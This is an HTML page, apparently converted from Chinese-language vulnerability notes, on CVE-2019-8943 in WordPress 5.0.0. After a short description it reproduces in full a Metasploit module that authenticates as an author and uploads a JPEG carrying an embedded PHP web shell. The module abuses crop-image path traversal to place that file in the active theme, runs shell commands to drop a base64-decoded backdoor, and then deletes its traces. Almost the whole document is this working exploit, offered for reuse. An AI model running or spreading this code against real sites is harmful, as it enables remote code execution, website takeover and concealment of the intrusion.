<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2019-8943）WordPress 5.0.0 - Crop-image Shell Upload (Metasploit)</h1><h2>一、漏洞简介</h2><p>WordPress通过5.0.3允许在wp_crop_image（）中进行路径遍历。攻击者（具有裁剪图像的特权）可以通过包含两个图像扩展名和../序列的文件名，例如以.jpg？/../../结尾的文件名，将输出图像写入任意目录。 file.jpg子字符串。</p><h2>二、漏洞影响</h2><h2>三、复现过程</h2><p>保存内容为xxx.md 并放到msf运行的目录下</p><p>##<br /># This module requires Metasploit: https://metasploit.com/download<br /># Current source: https://github.com/rapid7/metasploit-framework<br />##<br /><br />class MetasploitModule &lt; Msf::Exploit::Remote<br />  Rank = ExcellentRanking<br /><br />  include Msf::Exploit::FileDropper<br />  include Msf::Exploit::Remote::HTTP::Wordpress<br /><br />  def initialize(info = {})<br />    super(update_info(<br />      info,<br />      'Name'            =&gt; 'WordPress Crop-image Shell Upload',<br />      'Description'     =&gt; %q{<br />          This module exploits a path traversal and a local file inclusion<br />          vulnerability on WordPress versions 5.0.0 and &lt;= 4.9.8.<br />          The crop-image function allows a user, with at least author privileges,<br />          to resize an image and perform a path traversal by changing the _wp_attached_file<br />          reference during the upload. The second part of the exploit will include<br />          this image in the current theme by changing the _wp_page_template attribute<br />          when creating a post.<br /><br />          This exploit module only works for Unix-based systems currently.<br />      },<br />      'License'         =&gt; MSF_LICENSE,<br />      'Author'          =&gt;<br />      [<br />        'RIPSTECH Technology',                               # Discovery<br />        'Wilfried Becard &lt;wilfried.becard@synacktiv.com&gt;'    # Metasploit module<br />      ],<br />    'References'      =&gt;<br />      [<br />        [ 'CVE', '2019-8942' ],<br />        [ 'CVE', '2019-8943' ],<br />        [ 'URL', 'https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/']<br />      ],<br />      'DisclosureDate'  =&gt; 'Feb 19 2019',<br />      'Platform'        =&gt; 'php',<br />      'Arch'            =&gt; ARCH_PHP,<br />      'Targets'         =&gt; [['WordPress', {}]],<br />      'DefaultTarget'   =&gt; 0<br />    ))<br /><br />    register_options(<br />      [<br />        OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),<br />        OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with'])<br />      ])<br />  end<br /><br />  def check<br />    cookie = wordpress_login(username, password)<br />    if cookie.nil?<br />      store_valid_credential(user: username, private: password, proof: cookie)<br />      return CheckCode::Safe<br />    end<br /><br />    CheckCode::Appears<br />  end<br /><br />  def username<br />    datastore['USERNAME']<br />  end<br /><br />  def password<br />    datastore['PASSWORD']<br />  end<br /><br />  def get_wpnonce(cookie)<br />    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'media-new.php')<br />    res = send_request_cgi(<br />      'method'    =&gt; 'GET',<br />      'uri'       =&gt; uri,<br />      'cookie' =&gt; cookie<br />    )<br />    if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?<br />      res.get_hidden_inputs.first["_wpnonce"]<br />    end<br />  end<br /><br />  def get_wpnonce2(image_id, cookie)<br />    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')<br />    res = send_request_cgi(<br />      'method'    =&gt; 'GET',<br />      'uri'       =&gt; uri,<br />      'cookie'    =&gt; cookie,<br />      'vars_get'  =&gt; {<br />        'post'   =&gt; image_id,<br />        'action' =&gt; &quot;edit&quot;<br />      }<br />    )<br />    if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?<br />      tmp = res.get_hidden_inputs<br />      wpnonce2 = tmp[1].first[1]<br />    end<br />  end<br /><br />  def get_current_theme<br />    uri = normalize_uri(datastore['TARGETURI'])<br />    res = send_request_cgi!(<br />      'method'    =&gt; 'GET',<br />      'uri'       =&gt; uri<br />    )<br />    fail_with(Failure::NotFound, 'Failed to access Wordpress page to retrieve theme.') unless res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?<br /><br />    theme = res.body.scan(/\/wp-content\/themes\/(\w+)\//).flatten.first<br />    fail_with(Failure::NotFound, 'Failed to retrieve theme') unless theme<br /><br />    theme<br />  end<br /><br />  def get_ajaxnonce(cookie)<br />    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')<br />    res = send_request_cgi(<br />      'method'    =&gt; 'POST',<br />      'uri'       =&gt; uri,<br />      'cookie' =&gt; cookie,<br />      'vars_post'  =&gt; {<br />        'action' =&gt; 'query-attachments',<br />        'post_id' =&gt; '0',<br />        'query[item]' =&gt; '43',<br />        'query[orderby]' =&gt; 'date',<br />        'query[order]' =&gt; 'DESC',<br />        'query[posts_per_page]' =&gt; '40',<br />        'query[paged]' =&gt; '1'<br />      }<br />    )<br />    fail_with(Failure::NotFound, 'Unable to reach page to retrieve the ajax nonce') unless res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?<br />    a_nonce = res.body.scan(/"edit":"(\w+)"/).flatten.first<br />    fail_with(Failure::NotFound, 'Unable to retrieve the ajax nonce') unless a_nonce<br /><br />    a_nonce<br />  end<br /><br />  def upload_file(img_name, wp_nonce, cookie)<br />    img_data = %w[<br />      FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 60 00 60 00 00 FF ED 00 38 50 68 6F<br />      74 6F 73 68 6F 70 20 33 2E 30 00 38 42 49 4D 04 04 00 00 00 00 00 1C 1C 02 74 00<br />      10 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B 3F 3E 1C 02 00 00 02 00 04 FF FE 00<br />      3B 43 52 45 41 54 4F 52 3A 20 67 64 2D 6A 70 65 67 20 76 31 2E 30 20 28 75 73 69<br />      6E 67 20 49 4A 47 20 4A 50 45 47 20 76 38 30 29 2C 20 71 75 61 6C 69 74 79 20 3D<br />      20 38 32 0A FF DB 00 43 00 06 04 04 05 04 04 06 05 05 05 06 06 06 07 09 0E 09 09<br />      08 08 09 12 0D 0D 0A 0E 15 12 16 16 15 12 14 14 17 1A 21 1C 17 18 1F 19 14 14 1D<br />      27 1D 1F 22 23 25 25 25 16 1C 29 2C 28 24 2B 21 24 25 24 FF DB 00 43 01 06 06 06<br />      09 08 09 11 09 09 11 24 18 14 18 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24<br />      24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24 24<br />      24 24 24 24 24 24 24 FF C0 00 11 08 00 C0 01 06 03 01 22 00 02 11 01 03 11 01 FF<br />      C4 00 1F 00 00 01 05 01 01 01 01 01 01 00 00 00 00 00 00 00 00 01 02 03 04 05 06<br />      07 08 09 0A 0B FF C4 00 B5 10 00 02 01 03 03 02 04 03 05 05 04 04 00 00 01 7D 01<br />      02 03 00 04 11 05 12 21 31 41 06 13 51 61 07 22 71 14 32 81 91 A1 08 23 42 B1 C1<br />      15 52 D1 F0 24 33 62 72 82 09 0A 16 17 18 19 1A 25 26 27 28 29 2A 34 35 36 37 38<br />      39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A 73<br />      74 75 76 77 78 79 7A 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2 A3 A4<br />      A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2 D3 D4<br />      D5 D6 D7 D8 D9 DA E1 E2 E3 E4 E5 E6 E7 E8 E9 EA F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FF<br />      C4 00 1F 01 00 03 01 01 01 01 01 01 01 01 01 00 00 00 00 00 00 01 02 03 04 05 06<br />      07 08 09 0A 0B FF C4 00 B5 11 00 02 01 02 04 04 03 04 07 05 04 04 00 01 02 77 00<br />      01 02 03 11 04 05 21 31 06 12 41 51 07 61 71 13 22 32 81 08 14 42 91 A1 B1 C1 09<br />      23 33 52 F0 15 62 72 D1 0A 16 24 34 E1 25 F1 17 18 19 1A 26 27 28 29 2A 35 36 37<br />      38 39 3A 43 44 45 46 47 48 49 4A 53 54 55 56 57 58 59 5A 63 64 65 66 67 68 69 6A<br />      73 74 75 76 77 78 79 7A 82 83 84 85 86 87 88 89 8A 92 93 94 95 96 97 98 99 9A A2<br />      A3 A4 A5 A6 A7 A8 A9 AA B2 B3 B4 B5 B6 B7 B8 B9 BA C2 C3 C4 C5 C6 C7 C8 C9 CA D2<br />      D3 D4 D5 D6 D7 D8 D9 DA E2 E3 E4 E5 E6 E7 E8 E9 EA F2 F3 F4 F5 F6 F7 F8 F9 FA FF<br />      DA 00 0C 03 01 00 02 11 03 11 00 3F 00 3C 3F 3D 60 24 5F 47 45 54 5B 30 5D 60 3B<br />      3F 3E<br />    ]<br />    img_data = [img_data.join].pack('H*')<br />    img_name += '.jpg'<br /><br />    boundary = "#{rand_text_alphanumeric(rand(10) + 5)}"<br />    post_data = "--#{boundary}\r\n"<br />    post_data &lt;&lt; "Content-Disposition: form-data; name=\"name\"\r\n"<br />    post_data &lt;&lt; "\r\n#{img_name}\r\n"<br />    post_data &lt;&lt; "--#{boundary}\r\n"<br />    post_data &lt;&lt; "Content-Disposition: form-data; name=\"action\"\r\n"<br />    post_data &lt;&lt; "\r\nupload-attachment\r\n"<br />    post_data &lt;&lt; "--#{boundary}\r\n"<br />    post_data &lt;&lt; "Content-Disposition: form-data; name=\"_wpnonce\"\r\n"<br />    post_data &lt;&lt; "\r\n#{wp_nonce}\r\n"<br />    post_data &lt;&lt; "--#{boundary}\r\n"<br />    post_data &lt;&lt; "Content-Disposition: form-data; name=\"async-upload\"; filename=\"#{img_name}\"\r\n"<br />    post_data &lt;&lt; "Content-Type: image/jpeg\r\n"<br />    post_data &lt;&lt; "\r\n#{img_data}\r\n"<br />    post_data &lt;&lt; "--#{boundary}--\r\n"<br />    print_status("Uploading payload")<br />    upload_uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'async-upload.php')<br /><br />    res = send_request_cgi(<br />      'method'   =&gt; 'POST',<br />      'uri'      =&gt; upload_uri,<br />      'ctype'    =&gt; &quot;multipart/form-data; boundary=#{boundary}&quot;,<br />      'data'     =&gt; post_data,<br />      'cookie'   =&gt; cookie<br />    )<br />    fail_with(Failure::UnexpectedReply, 'Unable to upload image') unless res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?<br />    print_good("Image uploaded")<br />    res = JSON.parse(res.body)<br />    image_id = res["data"]["id"]<br />    update_nonce = res["data"]["nonces"]["update"]<br />    filename = res["data"]["filename"]<br />    return filename, image_id, update_nonce<br />  end<br /><br />  def image_editor(img_name, ajax_nonce, image_id, cookie)<br />    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')<br />    res = send_request_cgi(<br />      'method'    =&gt; 'POST',<br />      'uri'       =&gt; uri,<br />      'cookie' =&gt; cookie,<br />      'vars_post'  =&gt; {<br />        'action' =&gt; 'image-editor',<br />        '_ajax_nonce' =&gt; ajax_nonce,<br />        'postid' =&gt; image_id,<br />        'history' =&gt; '[{&quot;c&quot;:{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:400,&quot;h&quot;:300}}]',<br />        'target' =&gt; 'all',<br />        'context' =&gt; '',<br />        'do' =&gt; 'save'<br />      }<br />    )<br />    fail_with(Failure::NotFound, 'Unable to access page to retrieve filename') unless res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?<br />    filename = res.body.scan(/(#{img_name}-\S+)-/).flatten.first<br />    fail_with(Failure::NotFound, 'Unable to retrieve file name') unless filename<br /><br />    filename &lt;&lt; '.jpg'<br />  end<br /><br />  def change_path(wpnonce2, image_id, filename, current_date, path, cookie)<br />    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')<br />    res = send_request_cgi(<br />      'method'   =&gt; 'POST',<br />      'uri'      =&gt; uri,<br />      'cookie' =&gt; cookie,<br />      'vars_post'  =&gt; {<br />        '_wpnonce' =&gt; wpnonce2,<br />        'action' =&gt; 'editpost',<br />        'post_ID' =&gt; image_id,<br />        'meta_input[_wp_attached_file]' =&gt; &quot;#{current_date}#{filename}#{path}&quot;<br />      }<br />    )<br />  end<br /><br />  def crop_image(image_id, ajax_nonce, cookie)<br />    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')<br />    res = send_request_cgi(<br />      'method'   =&gt; 'POST',<br />      'uri'      =&gt; uri,<br />      'cookie' =&gt; cookie,<br />      'vars_post'  =&gt; {<br />        'action' =&gt; 'crop-image',<br />        '_ajax_nonce' =&gt; ajax_nonce,<br />        'id' =&gt; image_id,<br />        'cropDetails[x1]' =&gt; 0,<br />        'cropDetails[y1]' =&gt; 0,<br />        'cropDetails[width]' =&gt; 400,<br />        'cropDetails[height]' =&gt; 300,<br />        'cropDetails[dst_width]' =&gt; 400,<br />        'cropDetails[dst_height]' =&gt; 300<br />      }<br />    )<br />  end<br /><br />  def include_theme(shell_name, cookie)<br />    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post-new.php')<br />    res = send_request_cgi(<br />      'method'   =&gt; 'POST',<br />      'uri'      =&gt; uri,<br />      'cookie' =&gt; cookie<br />    )<br />    if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?<br />      wpnonce2 = res.body.scan(/name="_wpnonce" value="(\w+)"/).flatten.first<br />      post_id = res.body.scan(/"post":{"id":(\w+),/).flatten.first<br />      fail_with(Failure::NotFound, 'Unable to retrieve the second wpnonce and the post id') unless wpnonce2 &amp;&amp; post_id<br /><br />      post_title = Rex::Text.rand_text_alpha(10)<br />      uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')<br />      res = send_request_cgi(<br />        'method'   =&gt; 'POST',<br />        'uri'      =&gt; uri,<br />        'cookie' =&gt; cookie,<br />        'vars_post'  =&gt; {<br />          '_wpnonce'=&gt; wpnonce2,<br />          'action' =&gt; 'editpost',<br />          'post_ID' =&gt; post_id,<br />          'post_title' =&gt; post_title,<br />          'post_name' =&gt; post_title,<br />          'meta_input[_wp_page_template]' =&gt; &quot;cropped-#{shell_name}.jpg&quot;<br />        }<br />      )<br />      fail_with(Failure::NotFound, 'Failed to retrieve post id') unless res &amp;&amp; res.code == 302<br />      post_id<br />    end<br />  end<br /><br />  def check_for_base64(cookie, post_id)<br />    uri = normalize_uri(datastore['TARGETURI'])<br />    # Test if base64 is on target<br />    test_string = 'YmFzZTY0c3BvdHRlZAo='<br />    res = send_request_cgi!(<br />      'method'   =&gt; 'GET',<br />      'uri'      =&gt; uri,<br />      'cookie' =&gt; cookie,<br />      'vars_get' =&gt; {<br />        'p' =&gt; post_id,<br />        '0' =&gt; &quot;echo #{test_string} | base64 -d&quot;<br />      }<br />    )<br />    fail_with(Failure::NotFound, 'Unable to retrieve response to base64 command') unless res &amp;&amp; res.code == 200 &amp;&amp; !res.body.empty?<br /><br />    fail_with(Failure::NotFound, &quot;Can't find base64 decode on target&quot;) unless res.body.include?(&quot;base64spotted&quot;)<br />    # Execute payload with base64 decode<br />    @backdoor = Rex::Text.rand_text_alpha(10)<br />    encoded = Rex::Text.encode_base64(payload.encoded)<br />    res = send_request_cgi!(<br />      'method'   =&gt; 'GET',<br />      'uri'      =&gt; uri,<br />      'cookie' =&gt; cookie,<br />      'vars_get' =&gt; {<br />        'p' =&gt; post_id,<br />        '0' =&gt; &quot;echo #{encoded} | base64 -d &gt; #{@backdoor}.php&quot;<br />      }<br />    )<br /><br />    fail_with(Failure::NotFound, 'Failed to send payload to target') unless res &amp;&amp; res.code == 200 &amp;&amp; !res.body.empty?<br />    send_request_cgi(<br />      'method'  =&gt;  'GET',<br />      'uri'     =&gt;  normalize_uri(datastore['TARGETURI'], &quot;#{@backdoor}.php&quot;),<br />      'cookie'  =&gt;  cookie<br />    )<br />  end<br /><br />  def wp_cleanup(shell_name, post_id, cookie)<br />    print_status('Attempting to clean up files...')<br />    uri = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')<br />    res = send_request_cgi(<br />      'method'    =&gt; 'POST',<br />      'uri'       =&gt; uri,<br />      'cookie'    =&gt; cookie,<br />      'vars_post'  =&gt; { 'action' =&gt; &quot;query-attachments&quot; }<br />    )<br /><br />    fail_with(Failure::NotFound, 'Failed to receive a response for uploaded file') unless res &amp;&amp; res.code == 200 &amp;&amp; !res.body.empty?<br />    infos = res.body.scan(/id":(\d+),.*filename":"cropped-#{shell_name}".*?"delete":"(\w+)".*"id":(\d+),.*filename":"cropped-x".*?"delete":"(\w+)".*"id":(\d+),.*filename":"#{shell_name}".*?"delete":"(\w+)"/).flatten<br />    id1, id2, id3 = infos[0], infos[2], infos[4]<br />    delete_nonce1, delete_nonce2, delete_nonce3 = infos[1], infos[3], infos[5]<br />    for i in (0...6).step(2)<br />      res = send_request_cgi(<br />        'method'    =&gt; 'POST',<br />        'uri'       =&gt; uri,<br />        'cookie'    =&gt; cookie,<br />        'vars_post'  =&gt; {<br />            'action' =&gt; &quot;delete-post&quot;,<br />            'id'     =&gt; infos[i],<br />            '_wpnonce' =&gt; infos[i+1]<br />        }<br />      )<br />    end<br /><br />    uri1 = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'edit.php')<br />    res = send_request_cgi(<br />      'method'    =&gt; 'GET',<br />      'uri'       =&gt; uri1,<br />      'cookie'    =&gt; cookie<br />    )<br /><br />    if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?<br />      post_nonce = res.body.scan(/post=#{post_id}&amp;action=trash&amp;_wpnonce=(\w+)/).flatten.first<br />      fail_with(Failure::NotFound, 'Unable to retrieve post nonce') unless post_nonce<br />      uri2 = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'post.php')<br /><br />      res = send_request_cgi(<br />        'method'    =&gt; 'GET',<br />        'uri'       =&gt; uri2,<br />        'cookie'    =&gt; cookie,<br />        'vars_get'  =&gt; {<br />          'post'     =&gt; post_id,<br />          'action'   =&gt; 'trash',<br />          '_wpnonce' =&gt; post_nonce<br />        }<br />      )<br /><br />      fail_with(Failure::NotFound, 'Unable to retrieve response') unless res &amp;&amp; res.code == 302<br />      res = send_request_cgi(<br />        'method'    =&gt; 'GET',<br />        'uri'       =&gt; uri1,<br />        'cookie'    =&gt; cookie,<br />        'vars_get'  =&gt; {<br />          'post_status' =&gt; &quot;trash&quot;,<br />          'post_type'   =&gt; 'post',<br />          '_wpnonce' =&gt; post_nonce<br />        }<br />      )<br /><br />      if res &amp;&amp; res.code == 200 &amp;&amp; res.body &amp;&amp; !res.body.empty?<br />        nonce = res.body.scan(/post=#{post_id}&amp;action=delete&amp;_wpnonce=(\w+)/).flatten.first<br />        fail_with(Failure::NotFound, 'Unable to retrieve nonce') unless nonce<br /><br />        send_request_cgi(<br />          'method'    =&gt; 'GET',<br />          'uri'       =&gt; uri2,<br />          'cookie'    =&gt; cookie,<br />          'vars_get'  =&gt; {<br />            'post'     =&gt; post_id,<br />            'action'   =&gt; 'delete',<br />            '_wpnonce' =&gt; nonce<br />          }<br />        )<br />      end<br />    end<br />  end<br /><br />  def exploit<br />    fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?<br /><br />    print_status("Authenticating with WordPress using #{username}:#{password}...")<br />    cookie = wordpress_login(username, password)<br />    fail_with(Failure::NoAccess, 'Failed to authenticate with WordPress') if cookie.nil?<br />    print_good("Authenticated with WordPress")<br />    store_valid_credential(user: username, private: password, proof: cookie)<br /><br />    print_status("Preparing payload...")<br />    @current_theme = get_current_theme<br />    wp_nonce = get_wpnonce(cookie)<br />    @current_date = Time.now.strftime("%Y/%m/")<br /><br />    img_name = Rex::Text.rand_text_alpha(10)<br />    @filename1, image_id, update_nonce = upload_file(img_name, wp_nonce, cookie)<br />    ajax_nonce = get_ajaxnonce(cookie)<br /><br />    @filename1 = image_editor(img_name, ajax_nonce, image_id, cookie)<br />    wpnonce2 = get_wpnonce2(image_id, cookie)<br /><br />    change_path(wpnonce2, image_id, @filename1, @current_date, '?/x', cookie)<br />    crop_image(image_id, ajax_nonce, cookie)<br /><br />    @shell_name = Rex::Text.rand_text_alpha(10)<br />    change_path(wpnonce2, image_id, @filename1, @current_date, "?/../../../../themes/#{@current_theme}/#{@shell_name}", cookie)<br />    crop_image(image_id, ajax_nonce, cookie)<br /><br />    print_status("Including into theme")<br />    post_id = include_theme(@shell_name, cookie)<br /><br />    check_for_base64(cookie, post_id)<br />    wp_cleanup(@shell_name, post_id, cookie)<br />  end<br /><br />  def on_new_session(client)<br />    client.shell_command_token("rm wp-content/uploads/#{@current_date}#{@filename1[0...10]}*")<br />    client.shell_command_token("rm wp-content/uploads/#{@current_date}cropped-#{@filename1[0...10]}*")<br />    client.shell_command_token("rm -r wp-content/uploads/#{@current_date}#{@filename1[0...10]}*")<br />    client.shell_command_token("rm wp-content/themes/#{@current_theme}/cropped-#{@shell_name}.jpg")<br />    client.shell_command_token("rm #{@backdoor}.php")<br />  end<br />en</p></body></html>